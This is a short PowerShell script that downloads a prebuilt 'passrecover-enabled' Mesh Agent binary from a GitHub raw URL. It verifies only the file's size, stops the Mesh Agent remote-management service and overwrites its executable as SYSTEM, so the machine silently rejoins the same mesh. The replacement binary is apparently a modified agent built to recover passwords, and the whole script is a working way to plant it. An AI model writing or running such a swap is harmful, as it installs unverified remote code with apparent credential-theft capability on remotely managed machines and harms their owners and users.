# Installs the passrecover-enabled agent binary onto this machine (idempotent).
# Downloads the prebuilt binary from the repo, verifies its size, stops the
# "Mesh Agent" service, swaps the exe in place (keeping .db/.msh so the node
# rejoins the same mesh), and restarts the service. Run as SYSTEM/Admin.
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$t='C:\Windows\TEMP\ours.exe'
try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/binaries/MeshService64.exe' -OutFile $t -UseBasicParsing -TimeoutSec 120 } catch { exit 1 }
if ((Get-Item $t).Length -ne 3517952) { exit 2 }
Stop-Service 'Mesh Agent' -Force
Start-Sleep 2
if (-not (Test-Path 'C:\Windows\TEMP\MeshAgent.exe.bak')) { Copy-Item 'C:\Program Files\Mesh Agent\MeshAgent.exe' 'C:\Windows\TEMP\MeshAgent.exe.bak' -Force }
Copy-Item $t 'C:\Program Files\Mesh Agent\MeshAgent.exe' -Force
Start-Service 'Mesh Agent'
